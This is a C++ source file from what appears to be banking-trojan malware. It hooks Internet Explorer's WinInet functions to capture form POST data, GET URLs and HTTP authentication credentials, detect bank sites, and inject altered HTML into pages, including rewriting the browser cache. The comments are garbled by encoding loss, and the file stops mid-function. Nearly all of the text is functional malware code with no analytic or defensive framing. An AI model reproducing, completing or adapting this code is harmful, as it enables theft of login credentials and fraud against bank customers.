#include <windows.h>
#include <wininet.h>
#include <urlmon.h>

#include "BotCore.h"
#include "InternetExplorer.h"
#include "HTMLInjectsScriptAdapter.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Splice.h"
#include "Loader.h"
#include "Config.h"
#include "ntdll.h"
#include "Requests.h"
#include "BotHTTP.h"
#include "HTTPConsts.h"
#include "GETDataGrabber.h"

#include "Modules.h"

//#include "IECacheUtils.h"

//#include "BotDebug.h"

// ��� ������� ������� �� ����� ������ ��� IE
typedef BOOL(WINAPI * FUNC_HttpSendRequestA)
(HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional,
	DWORD dwOptionalLength);
typedef BOOL(WINAPI * FUNC_HttpSendRequestW)
(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional,
	DWORD dwOptionalLength);

typedef BOOL(WINAPI * FUNC_HttpSendRequestExA)(HINTERNET hRequest,
	LPINTERNET_BUFFERSA lpBuffersIn, LPINTERNET_BUFFERSA lpBuffersOut,
	DWORD dwFlags, DWORD_PTR dwContext);
typedef BOOL(WINAPI * FUNC_HttpSendRequestExW)(HINTERNET hRequest,
	LPINTERNET_BUFFERSW lpBuffersIn, LPINTERNET_BUFFERSW lpBuffersOut,
	DWORD dwFlags, DWORD_PTR dwContext);

typedef BOOL(WINAPI * FUNC_InternetReadFile)
(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);

typedef BOOL(WINAPI * FUNC_InternetReadFileExA)(HINTERNET hFile,
	LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext);
typedef BOOL(WINAPI * FUNC_InternetReadFileExW)(HINTERNET hFile,
	LPINTERNET_BUFFERSW lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext);

typedef BOOL(WINAPI * FUNC_InternetQueryDataAvailable)
(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);

typedef BOOL(WINAPI * FUNC_InternetCloseHandle)(HINTERNET hInternet);
typedef HWND(WINAPI * PCreateWindowExA)(DWORD dwExStyle, LPCSTR lpClassName,
	LPCSTR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight,
	HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);

typedef HINTERNET(WINAPI * FUNC_HttpOpenRequestA)
(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion,
	LPCSTR lpszReferrer, LPCSTR FAR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);

typedef HINTERNET(WINAPI * FUNC_HttpOpenRequestW)
(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion,
	LPCWSTR lpszReferrer, LPCWSTR FAR * lplpszAcceptTypes, DWORD dwFlags,
	DWORD_PTR dwContext);

typedef BOOL (WINAPI *FUNC_HttpQueryInfo)(
    HINTERNET hRequest,
	DWORD dwInfoLevel,
	LPVOID lpBuffer,
	LPDWORD lpdwBufferLength,
	LPDWORD lpdwIndex);

typedef HINTERNET (WINAPI *FUNC_InternetConnect)
	(
	HINTERNET hInternet,
	LPCSTR lpszServerName,
	INTERNET_PORT nServerPort,
	LPCSTR lpszUserName,
	LPCSTR lpszPassword,
	DWORD dwService,
	DWORD dwFlags,
	DWORD_PTR dwContext
	);


void AddPageToCashe(PRequest Request);


typedef BOOL (WINAPI *FUNC_InternetWriteFile) (HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten );


PCreateWindowExA Real_CreateWindowExA;

FUNC_HttpSendRequestA REAL_HttpSendRequestA;
FUNC_HttpSendRequestW REAL_HttpSendRequestW;

FUNC_HttpSendRequestExA REAL_HttpSendRequestExA;
FUNC_HttpSendRequestExW REAL_HttpSendRequestExW;

FUNC_InternetReadFile REAL_InternetReadFile;

FUNC_InternetReadFileExA REAL_InternetReadFileExA;
FUNC_InternetReadFileExW REAL_InternetReadFileExW;

FUNC_InternetQueryDataAvailable REAL_InternetQueryDataAvailable;
FUNC_InternetCloseHandle REAL_InternetCloseHandle;

FUNC_HttpOpenRequestA REAL_HttpOpenRequestA;
FUNC_HttpOpenRequestW REAL_HttpOpenRequestW;


FUNC_HttpQueryInfo REAL_HttpQueryInfoA;
FUNC_HttpQueryInfo REAL_HttpQueryInfoW;

FUNC_InternetConnect REAL_InternetConnectA;
FUNC_InternetConnect REAL_InternetConnectW;

FUNC_InternetWriteFile REAL_InternetWriteFile;


// ������ ������ ����������� ��������� InternetExplorer
template<class REQUEST, class DATA, class STR_>void IEDBG_Template
(REQUEST Request, DATA Data, STR_ Str) {
#ifdef DebugUtils
	PRequest R = (PRequest)Request;
	PCHAR Section = StrLongToString((DWORD)R + (DWORD)R->Owner);
	Debug::MessageEx("InternetExplorer", 0, Section, (PCHAR)Data, (PCHAR)Str);
	STR::Free(Section);
#endif
}

template<class REQUEST, class DATA, class STR_, class DATA1>void IEDBG_Template
(REQUEST Request, DATA Data, STR_ Str, DATA1 Data1) {
#ifdef DebugUtils
	PRequest R = (PRequest)Request;
	PCHAR Section = StrLongToString((DWORD)R + (DWORD)R->Owner);
	Debug::MessageEx("InternetExplorer", 0, Section, (PCHAR)Data, (PCHAR)Str,
		Data1);
	STR::Free(Section);
#endif
}

template<class STR>void IEDBG_Template(STR Str) {
#ifdef DebugUtils
	Debug::MessageEx("InternetExplorer", 0, NULL, NULL, (PCHAR)Str);
#endif
}

#define IEDBG IEDBG_Template<>

HWND WINAPI Hook_CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName,
	LPCSTR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight,
	HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam) {
	// ���������� ���� �� �������
	HWND hWnd = Real_CreateWindowExA(dwExStyle, lpClassName, lpWindowName,
		dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam);

	return hWnd;
}

/* ��������������� ���������� ������� */
DWORD WINAPI ReadDataProc(PRequest Request);
void SetCallbackMethod(PRequest Request, INTERNET_STATUS_CALLBACK Method);
void RestoreCallbackMethod(PRequest Request);
void FreeIRRequestData(LPVOID Request);

/* ---------------------------------------------------------------------------- */

PCHAR IEUserAgent = NULL; // ���� ����� ������� ������ �������� ����������

PRequestList Requests; // ���������� ������ ��������

void InitIEGlobalData() {
	// �������������� ������ ����������� ��� ��������� �������� Internet Explorer
	Requests = Request::CreateList(NULL, FreeIRRequestData);
	IEUserAgent = NULL;
}

void FreeIRRequestData(LPVOID Request) {
	// ��� �������� ������� ��������������� ������ �������� �����
	RestoreCallbackMethod((PRequest)Request);
}

#ifdef HTMLInjectsH

bool DoInjectIE(PRequest Request)
{

	if (!Request->IsInject || Request->Injected)
		return Request->IsInject && Request->Injected;

	#ifdef BssSendFileH
		AddBSSFile(Request->URL, Request->Buffer, Request->BufferSize);
	#endif

	Request::CloseReceiveData(Request);

	// �������������� ���������� � ������
	Request->Injected = true;


	if (List::Count(Request->Injects) == 0)
    	return false;

	// ������������ ����������� ������
	//IEDBG(Request, Request->Buffer, "--->> ��������� HTML �������");

	THTTPSessionInfo Session;

	Session.BrowserType = BROWSER_TYPE_IE;
	Session.UserAgent   = IEUserAgent;
	Session.URL         = Request->URL;

	bool Res = HTMLInjects::Execute(Request, &Session);

	if (Res)
	{
		Request->DocumentNeedCached = true;
		AddPageToCashe(Request);
	}
	return Res;
}
#endif

// ---------------------------------------------------------------------------

PCHAR GetInetOption(HINTERNET Handle, DWORD Option)
{
	// �������� �������� ��� �������� ������
	if (Handle == NULL)
		return NULL;
	PCHAR Result = NULL;
	DWORD Size = 0;
	if (!pInternetQueryOptionA(Handle, Option, NULL, &Size) && Size != 0)
	{
		Result = STR::Alloc(Size);
		pInternetQueryOptionA(Handle, Option, (LPVOID)Result, &Size);
		if (STR::IsEmpty(Result))
			STR::Free2(Result);

	}
	return Result;
}
// ---------------------------------------------------------------------------

PCHAR GetHTTPInfo(HINTERNET Handle, DWORD Option)
{
	// �������� �������� ��� �������� ������
	if (Handle == NULL)
		return NULL;
	PCHAR Result = NULL;
	DWORD Size = 0;
	if (!pHttpQueryInfoA(Handle, Option, NULL, &Size, NULL) && Size != 0)
	{
		Result = STR::Alloc(Size);
		pHttpQueryInfoA(Handle, Option, (LPVOID)Result, &Size, NULL);
		if (STR::IsEmpty(Result))
			STR::Free2(Result);
	}
	return Result;
}
// ---------------------------------------------------------------------------

void UpdateIEUserAgent(HINTERNET Handle) {
	// �������� ��� ������
	if (IEUserAgent != NULL)
		return;

	HINTERNET Parent;
	DWORD Size = sizeof(HINTERNET);

	pInternetQueryOptionA(Handle, INTERNET_OPTION_PARENT_HANDLE, &Parent,
		&Size);
	pInternetQueryOptionA(Parent, INTERNET_OPTION_PARENT_HANDLE, &Parent,
		&Size);

	IEUserAgent = GetInetOption(Parent, INTERNET_OPTION_USER_AGENT);
}
// ---------------------------------------------------------------------------

void WINAPI FORMGrabber(PRequest Request)
{
	// ����� ������ POST ������

	if (Request->Method != hmPOST || Request->Optional == NULL)
		return;

	// ��������� ��� ������������ ������

	PCHAR ContentType = GetHTTPInfo((HINTERNET)Request->Owner,
		HTTP_QUERY_CONTENT_TYPE | HTTP_QUERY_FLAG_REQUEST_HEADERS);

	DWORD dwHash_UrlEncoded = 0x6B3CDFEC;

	if (CalcHash(ContentType) != dwHash_UrlEncoded) {
		STR::Free(ContentType);
		return;
	}
	STR::Free(ContentType);

	// �������� ��� ������
	UpdateIEUserAgent((HINTERNET)Request->Owner);

	// ���������� ������
	DataGrabber::AddHTMLFormData(Request->URL, Request->Optional, IEUserAgent,
		BROWSER_TYPE_IE, DATA_TYPE_FORM);
}
// ---------------------------------------------------------------------------

//void AddCacheFileNameMask(PCHAR URL, PCHAR ContentType) {
//	// ������� ���������� ��������� ����� ����� ����
//	bool CheckExtension = false;
//
//	if (ContentType != NULL)
//	{
//		DWORD Hashes[] = {
//			0x703975CC /* text/javascript */ ,
//			0x1E3AEADB /* application/x-javascript */ ,
//			0x26A6F9D7 /* application/javascript */ , 0
//		};
//
//		DWORD Len = 0;
//		PCHAR End = STR::Scan(ContentType, ';');
//		if (End != NULL)
//			Len = End - ContentType;
//
//		// ��������� ����� �� ��� ������������ ��������
//		DWORD Hash = STR::GetHash(ContentType, Len, true);
//		bool Support = false;
//		for (int i = 0; Hashes[i] != 0; i++) {
//			if (Hash == Hashes[i]) {
//				Support = true;
//				break;
//			}
//
//		}
//
//		if (!Support)
//			return;
//	}
//	else
//		CheckExtension = true;
//
//	// ���������� ����� �����
//
//	PCHAR FileName = File::ExtractFileNameA(URL, true);
//	PCHAR ExtPos = STR::Scan(FileName, '.');
//	if (ExtPos != NULL) {
//		if (CheckExtension) {
//			DWORD ExtHash = STR::GetHash(ExtPos, 0, true);
//			if (ExtHash != 0xBB573 /* .js */ ) {
//				STR::Free(FileName);
//				return;
//			}
//		}
//		*ExtPos = 0;
//	}
//
//	PCHAR FN = STR::New(2, FileName, "*.js");
//
////	IECache::AddMask(FN);
//
//	STR::Free(FN);
//	STR::Free(FileName);
//
//}

// ---------------------------------------------------------------------------


PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
	DWORD OptionalLength, bool &CancelRequest)
{

	// ������������ ������
	if (Handle == NULL)
		return NULL;


	// ������������ ������ GET � POST ������
	PCHAR Method = GetHTTPInfo(Handle, HTTP_QUERY_REQUEST_METHOD);
	if (Method == NULL)
		return NULL;

	THTTPMethod MID = GetMethodFromStr(Method);
	STR::Free(Method);

	if (MID != hmGET && MID != hmPOST)
		return NULL;

	// ��������� ����� ������
	PRequest Request = Request::Add(Requests, Handle, NULL);
	if (Request == NULL)
		return NULL;

	Request->URL = GetInetOption(Handle, INTERNET_OPTION_URL);
	Request->Method = MID;

	IEDBG(Request, NULL, "������������� ������ �� %s", Request->URL);


	// ������������ �������������� �� ��������� ��������
	ProcessHTMLInjectRequest(Request->URL, false, &CancelRequest);
	if (CancelRequest)
		return Request;


	#ifdef bsssignH
		BSSSign::CheckRequest(Request->URL);
	#endif

	#ifdef JavaClient2015SaverH
		CheckJavaClient2015File(Request->URL);
	#endif

	// ��� ������������� ���������� GET ������
	#ifdef GETDataGrabberH
		if (MID == hmGET)
		{
			UpdateIEUserAgent((HINTERNET)Request->Owner);
			SendGETData(Request->URL, IEUserAgent, BROWSER_TYPE_IE);
		}
	#endif


	// ���������� POST ������

	if (Optional != NULL && OptionalLength > 0 &&
		OptionalLength <= MAX_FORM_GRABBER_DATA_SIZE)
	{
		IEDBG(Request, (PCHAR)Optional, "������������� POST ������");
		Request->Optional = STR::New((PCHAR)Optional, OptionalLength);
		FORMGrabber(Request);
	}

#ifdef HTMLInjectsH
	Config::GetInjectsForRequest(Request);

	if (Request->IsInject)
	{
		IEDBG(Request, NULL, "�������� �������� �������. %s", Request->URL);

		//AddCacheFileNameMask(Request->URL, NULL);

		pDeleteUrlCacheEntry(Request->URL);

		pHttpAddRequestHeadersA(Handle, (LPCTSTR)"Accept-Encoding:\n", -1,
			HTTP_ADDREQ_FLAG_REPLACE);

//		PCHAR Header = "If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT\r\n";
//		pHttpAddRequestHeadersA(Handle, Header, StrCalcLength(Header), HTTP_ADDREQ_FLAG_REPLACE || HTTP_ADDREQ_FLAG_ADD);
		// pHttpAddRequestHeadersA(Handle, (LPCTSTR)"TE:\r\n", -1, HTTP_ADDREQ_FLAG_REPLACE );
	}
#endif
	IEDBG(Request, NULL, "������ ������� ���������");


	#ifdef BssSendFileH
		if (!Request->IsInject)
			Request->IsInject = IsBSSDocument(Request->URL);
	#endif

	// ������������ �������������� ������
#ifdef HunterH
	URLHunter::CheckURL(Request->URL);
#endif

	// ------------------------

	return Request;
}

BOOL WINAPI HttpSendRequestHandler(BOOL bType, HINTERNET hRequest,
	LPBYTE lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional,
	DWORD dwOptionalLength)
{
	// �������� ���������� � �������

#ifdef RuBnkH
	IsBank(hRequest);
#endif


	if (dwHeadersLength != 0)
	{
		if (bType)
			pHttpAddRequestHeadersA(hRequest, (LPCTSTR)lpszHeaders,
			dwHeadersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
		else
			pHttpAddRequestHeadersW(hRequest, (LPCWSTR)lpszHeaders,
			dwHeadersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
	}

	// ������������ ������
    bool CancelRequest = false;
	HttpPreSendRequest(hRequest, lpOptional, dwOptionalLength, CancelRequest);

	// �������� ������������ ����� �������

	BOOL ret = -1;

	if (!CancelRequest)
	{
		if (bType)
			ret = REAL_HttpSendRequestA(hRequest, NULL, dwHeadersLength,
										lpOptional, dwOptionalLength);
		else
			ret = REAL_HttpSendRequestW(hRequest, NULL, 0, lpOptional,
										dwOptionalLength);
	}
	else
		pSetLastError(2);

    DWORD Err = pGetLastError();
	return ret;
}

BOOL WINAPI HttpSendRequestExHandler(BOOL bType, HINTERNET hRequest,
	LPINTERNET_BUFFERSA lpBuffersIn, LPINTERNET_BUFFERSA lpBuffersOut,
	DWORD dwFlags, DWORD_PTR dwContext)
{


	#ifdef RuBnkH
		IsBank(hRequest);
	#endif

	if (lpBuffersIn->dwHeadersLength && lpBuffersIn->lpcszHeader) {
		if (bType)
		{
			pHttpAddRequestHeadersA((HINTERNET)hRequest, (LPCTSTR)
				lpBuffersIn->lpcszHeader, lpBuffersIn->dwHeadersLength,
				HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
		}
		else
		{
			pHttpAddRequestHeadersW((HINTERNET)hRequest, (LPCWSTR)
				lpBuffersIn->lpcszHeader, lpBuffersIn->dwHeadersLength,
				HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
		}

		pHttpAddRequestHeadersA(hRequest, (LPCTSTR)"Accept-Encoding:\n", -1,
			HTTP_ADDREQ_FLAG_REPLACE);
	}

	if (bType)
		return(BOOL)REAL_HttpSendRequestExA
			(hRequest, lpBuffersIn, lpBuffersOut, dwFlags, dwContext);
	else
		return(BOOL)REAL_HttpSendRequestExW(hRequest, (LPINTERNET_BUFFERSW)
			lpBuffersIn, (LPINTERNET_BUFFERSW)lpBuffersOut, dwFlags, dwContext);
}
// -----------------------------------------------------------------------------

void CallISC(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus,
	LPVOID lpvStatusInformation, DWORD dwStatusInformationLength) {
	// �������� ����� �������� �����

	INTERNET_STATUS_CALLBACK isc = NULL;
	DWORD s = sizeof(INTERNET_STATUS_CALLBACK);

	if (pInternetQueryOptionA(hInternet, INTERNET_OPTION_CALLBACK, &isc, &s)
		&& isc)
	{
		DWORD_PTR t;

		s = sizeof(DWORD_PTR);

		if (pInternetQueryOptionA(hInternet, INTERNET_OPTION_CONTEXT_VALUE, &t, &s))
			dwContext = t;

		isc(hInternet, dwContext, dwInternetStatus, lpvStatusInformation,
			dwStatusInformationLength);
	}
	else {
		s = sizeof(HINTERNET);

		if (pInternetQueryOptionA(hInternet, INTERNET_OPTION_PARENT_HANDLE,
				&hInternet, &s))
			CallISC(hInternet, dwContext, dwInternetStatus,
			lpvStatusInformation, dwStatusInformationLength);
	}
}
// -----------------------------------------------------------------------------

void CheckBASICAuthorization(PRequest Request)
{
	// ����� ��������� ������� � ������� ���������� � BASIC �����������

	// �������� ��� ������������
	PCHAR User = GetInetOption((HINTERNET)Request->Owner,
		INTERNET_OPTION_USERNAME);
	if (STR::IsEmpty(User))
		return;
	PCHAR Password = GetInetOption((HINTERNET)Request->Owner,
		INTERNET_OPTION_PASSWORD);

	// ���������� ������
	THTTPSessionInfo Session;
	Session.BrowserType = BROWSER_TYPE_IE;
	Session.URL = Request->URL;
	Session.UserAgent = IEUserAgent;

	// DataGrabber::AddBASICAuthorizationData(&Session, User, Password);
	STR::Free(User);
	STR::Free(Password);

}
// -----------------------------------------------------------------------------

void CallPreviosStatusCallback(INTERNET_STATUS_CALLBACK CallBack,
	HINTERNET Internet, DWORD_PTR Content, DWORD dwInternetStatus,
	LPVOID lpvStatusInformation, DWORD dwStatusInformationLength)
{
	// �������� ���������� ����� �������� �����
	if (CallBack != NULL)
		CallBack(Internet, Content, dwInternetStatus, lpvStatusInformation,
		dwStatusInformationLength);
}
// -----------------------------------------------------------------------------

void CALLBACK InternetStatusCallback(HINTERNET hInternet, DWORD_PTR dwContext,
	DWORD dwInternetStatus, LPVOID lpvStatusInformation,
	DWORD dwStatusInformationLength)
{
	// ������������ ����������� �������� ����� �� ��������� ������� ���������

	PRequest Request = (PRequest)dwContext;

	if (dwInternetStatus == INTERNET_STATUS_REQUEST_COMPLETE) {
		if (Request->Entry == MAXDWORD)
			pSetEvent(Request->Event);
		else
			ReadDataProc(Request);
	}

}
// -----------------------------------------------------------------------------

void SetCallbackMethod(PRequest Request, INTERNET_STATUS_CALLBACK Method) {
	// ������������� ����� �������� �����

	RestoreCallbackMethod(Request);

	DWORD Size = sizeof(DWORD_PTR);

	// ��������� ������ ������
	pInternetQueryOptionA((HINTERNET)Request->Owner,
		INTERNET_OPTION_CONTEXT_VALUE, &Request->OldContext, &Size);

	// ������������� ���� ������
	Request->OldCallback = pInternetSetStatusCallback((HINTERNET)Request->Owner, Method);

	pInternetSetOptionA((HINTERNET)Request->Owner,
		INTERNET_OPTION_CONTEXT_VALUE, &Request, sizeof(DWORD_PTR));

}
// -----------------------------------------------------------------------------

void RestoreCallbackMethod(PRequest Request)
{
	// ��������������� ������� �������� �����
	if (Request != NULL && Request->OldCallback != NULL) {
		pInternetSetOptionA(Request->Owner, INTERNET_OPTION_CONTEXT_VALUE,
			&Request->OldContext, sizeof(DWORD_PTR));
		pInternetSetStatusCallback(Request->Owner, (INTERNET_STATUS_CALLBACK)Request->OldCallback);

		Request->OldCallback = NULL;
		Request->OldContext = 0;
	}
}
// -----------------------------------------------------------------------------

void WaitCallbackEvent(PRequest Request)
{
	// ������� ������� �������� �����
	// ����� �������������� ���� ��������� ��������� �� �������������
	// ������� Event
	MSG Msg;
	do
	{
		while (pPeekMessageW(&Msg, NULL, 0, 0, PM_REMOVE))
			pDispatchMessageW(&Msg);

	}
	while (pMsgWaitForMultipleObjects(1, &Request->Event, FALSE, INFINITE,
			QS_ALLEVENTS) != WAIT_OBJECT_0);

	pResetEvent(Request->Event);
}
// -----------------------------------------------------------------------------

void AddPageToCashe(PRequest Request)
{
	// � ������ ���������                                                                                                                          ���� � ���������� ����������� � ����������
	// ������������ �������� ����������� ������

	if (Request == NULL || STR::IsEmpty(Request->URL)
		|| !Request->DocumentNeedCached)
		return;

	DWORD CacheSize = 4096;
	INTERNET_CACHE_ENTRY_INFOA *Info = (INTERNET_CACHE_ENTRY_INFOA*)MemAlloc(CacheSize);


	if (Info)
	{
		Info->dwStructSize = sizeof(INTERNET_CACHE_ENTRY_INFOA);

		if ((BOOL)pGetUrlCacheEntryInfoA(Request->URL, Info, &CacheSize)
			&& Info->lpszLocalFileName && *Info->lpszLocalFileName != 0) {
			File::WriteBufferA(Info->lpszLocalFileName, Request->Buffer,
				Request->BufferSize);
			Request->DocumentNeedCached = false;

		}

		MemFree(Info);
	}

}

/*
void AddPageToCashe(PRequest Request)
{
//  � ������ ���������                                                                                                                          ���� � ���������� ����������� � ����������
//  ������������ �������� ����������� ������
const DWORD dwUrlSize = 1024;
WCHAR lpUrl[dwUrlSize];


if( (BOOL)pInternetQueryOptionW(Request->Owner, INTERNET_OPTION_URL, lpUrl, &dwUrlSize ) )
{
DWORD dwCacheSize = 4096;
INTERNET_CACHE_ENTRY_INFOW *picei = (INTERNET_CACHE_ENTRY_INFOW *)MemAlloc( dwCacheSize );

if( picei )
{
picei->dwStructSize = sizeof(INTERNET_CACHE_ENTRY_INFOW );

if ( (BOOL)pGetUrlCacheEntryInfoW( lpUrl, picei, &dwCacheSize) && picei->lpszLocalFileName && *picei->lpszLocalFileName != 0 )
{
File::WriteBufferW(picei->lpszLocalFileName, Request->Buffer, Request->BufferSize );
}
}

MemFree( picei );
}

} */
// -----------------------------------------------------------------------------

DWORD WINAPI ReadDataProc(PRequest Request)
{
	if (!Request) return 0;

	DWORD dwLastError = ERROR_SUCCESS;
	int r = 1;

	if (Request->Entry == 0 || Request->Entry == MAXDWORD)
	{
		// �������� ���������� �� ��������� �����, �������������� ���
		IEDBG(Request, NULL, "��������� ��������");

		Request->Event = pCreateEventW(NULL, TRUE, FALSE, NULL);

		// ������������� ����� �������� �����
		SetCallbackMethod(Request, InternetStatusCallback);
	}

	// �������������� ����� �����
	Request::InitializeReceiveData(Request);

	PMemBlockList List = Request->ReceiveList;
	if (List == NULL) return 0;


	INTERNET_BUFFERSA IB;
	ClearStruct(IB);

	IB.dwStructSize = sizeof(INTERNET_BUFFERSA);
	IB.lpvBuffer = (LPBYTE)Request->ReceiveBuf->Data;

	// ��������� ���� ��������
	for (; ; )
	{
		IB.dwBufferLength = Request->ReceiveBuf->Size;

		if (!REAL_InternetReadFileExA((HINTERNET)Request->Owner, &IB,
				IRF_NO_WAIT, (DWORD_PTR)Request))
		{
			if ((dwLastError = (DWORD)pGetLastError()) == ERROR_IO_PENDING)
			{
				if (Request->Entry != MAXDWORD)
				{
					Request->Entry++;
					return 0;
				}

				// ������� ������� �������� �����
				WaitCallbackEvent(Request);
				continue;
			}

			r = 0;
			break;
		}

		dwLastError = ERROR_SUCCESS;

		// ���� ��� ������ ��������� �� ��������� ����
		if (IB.dwBufferLength == 0) break;


		MEMBLOCK::AddBlock(List, IB.lpvBuffer, IB.dwBufferLength);
	}


    Request::CloseReceiveData(Request);

#ifdef HTMLInjectsH
	// ������������ ����������� ������
	if (r )
	{
		DoInjectIE(Request);
	}
#endif

	// ����������� �������������� �������
	pCloseHandle(Request->Event);

	// ���������� ����� �������� �����
	RestoreCallbackMethod(Request);

	IEDBG(Request, Request->Buffer, "�������� ��������");

	// ������������� ������� ����������� ��������
	Request->FileReaded = true;

	// �������� ������ ����� �������� �����
	if (Request->Entry > 0 && Request->Entry != MAXDWORD)
	{
		INTERNET_ASYNC_RESULT iar;

		iar.dwError = dwLastError;
		iar.dwResult = r;
		CallISC((HINTERNET)Request->Owner, (DWORD)Request->OldContext,
			INTERNET_STATUS_REQUEST_COMPLETE, &iar, sizeof
			(INTERNET_ASYNC_RESULT));
	}

	return r;
}

// -----------------------------------------------------------------------------

int InjectReadFile(PRequest Request, LPVOID lpBuffer,
	DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead,
	DWORD_PTR dwContext)
{
	// ������� �������� �����
	if (!Request) return 1;

	int r = 1;

	*lpdwNumberOfBytesRead = 0;

	// ���� �������� ��� �� ��������� �� ��������� � ��������
	if (!Request->FileReaded)
	{
		if (lpBuffer == NULL)
			Request->Entry = MAXDWORD;

		// ��������� ������ �����
		r = ReadDataProc(Request);
	}

	// ���� �������� ��������� �� ����� ������ ��������, �� ���� �������
	if (Request->FileReaded && r && Request->Injected)
	{
		*lpdwNumberOfBytesRead = Request::GetNextDataPart(Request, lpBuffer,
			dwNumberOfBytesToRead, true);
	}

	return r;
}
//-----------------------------------------------------------------------------

void HandleFirstRead(PRequest Request)
{
	// ��������� ��������� BASIC �����������
	CheckBASICAuthorization(Request);

	if (!Request->IsInject)
		return;

	IEDBG(Request, NULL, "������������ ����� �������:");
	// ��������� ������ ������
	DWORD Status = 0;
	DWORD Size = sizeof(Status);
	pHttpQueryInfoA((HINTERNET)Request->Owner,
		HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &Status, &Size, NULL);

	IEDBG(Request, NULL, "��� ������: %d", Status);
	if (Status != HTTP_STATUS_OK) {
		Request->IsInject = false;
		return;
	}

	// ��������� ��� ��������
#ifdef HTMLInjectsH
	PCHAR ContentType = GetHTTPInfo((HINTERNET)Request->Owner,
		HTTP_QUERY_CONTENT_TYPE);
	bool Support = HTMLInjects::SupportContentType(ContentType);
	if (Support)
	{
		//AddCacheFileNameMask(Request->URL, ContentType);
	}
	else
	{
		Request->IsInject = false;
		IEDBG(Request, NULL, "������� %s �� ��������������!", ContentType);
	}

	STR::Free(ContentType);
#endif
}
//-----------------------------------------------------------------------------

BOOL __stdcall InternetHandler(BYTE bType, HINTERNET hFile, LPVOID lpBuffer,
	DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead, DWORD dwFlags,
	DWORD_PTR dwContext)
{
	// ������� ��������� ������� ��� ������ � �������� ������ ������
	int r = 0;

	PRequest pRequest = Request::Find(Requests, hFile);

	if (pRequest)
	{
		// ��� ������ ������� ������ ��������� �������������� ������
		if (!pRequest->FirstHandled)
		{
			pRequest->FirstHandled = true;

			// DbgMsg("InternetExplorer", 0, "�����(%d) %s", (DWORD)pRequest->IsInject, pRequest->URL);
			HandleFirstRead(pRequest);

			if (pRequest->IsInject)
				pRequest->AllowClose = pCreateEventW(NULL, TRUE, TRUE, NULL);
		}

		// ���� ��� ������ � ������ �� �����, �� ���������� ����
		// ������ ������
		if (pRequest->IsInject)
		{
			// �� ����� ���������� ������� ����������� ������� �������� �������
			pResetEvent(pRequest->AllowClose);

			if (bType == 0)
			{
				// ���������� ������ WinInet InternetReadFile
				r = InjectReadFile(pRequest, lpBuffer, dwNumberOfBytesToRead,
					lpdwNumberOfBytesRead, dwContext);
			}
			else if (bType == 1 || bType == 2)
			{
				// ���������� ������ WinInet InternetReadFileExA, InternetReadFileExA
				LPINTERNET_BUFFERSA pib = (LPINTERNET_BUFFERSA)lpBuffer;
				r = InjectReadFile
					(pRequest, pib->lpvBuffer, pib->dwBufferLength, &pib->dwBufferLength, dwContext);
			}
			else if (bType == 3) {
				// ������������� ����� ��������� ������
				r = InjectReadFile(pRequest, NULL, 0, lpdwNumberOfBytesRead,
					dwContext);
			}

			// ��������� �������� �������
			pSetEvent(pRequest->AllowClose);

			return r;
		}
	}

	// �������� ����������� ������ ������ � ����������
	if (bType == 0)
		r = REAL_InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead,
			lpdwNumberOfBytesRead);
	else
	if (bType == 1)
		r = REAL_InternetReadFileExA(hFile, (LPINTERNET_BUFFERSA)lpBuffer,
			dwFlags, dwContext);
	else
	if (bType == 2)
		r = REAL_InternetReadFileExW(hFile, (LPINTERNET_BUFFERSW)lpBuffer,
			dwFlags, dwContext);
	else
	if (bType == 3)
		r = REAL_InternetQueryDataAvailable(hFile, lpdwNumberOfBytesRead,
			dwFlags, dwContext);

	return r;
}

// ----------------------------------------------------------------------------
BOOL __stdcall HOOK_HttpSendRequestA(HINTERNET hRequest, LPCTSTR lpszHeaders,
	DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
{
	return HttpSendRequestHandler(TRUE, hRequest, (LPBYTE)lpszHeaders,
		dwHeadersLength, lpOptional, dwOptionalLength);
}
// ----------------------------------------------------------------------------

BOOL __stdcall HOOK_HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpcwHeaders,
	DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
{
	return HttpSendRequestHandler(FALSE, hRequest, (LPBYTE)lpcwHeaders,
		dwHeadersLength, lpOptional, dwOptionalLength);
}
// ----------------------------------------------------------------------------

BOOL __stdcall HOOK_HttpSendRequestExA(HINTERNET hRequest,
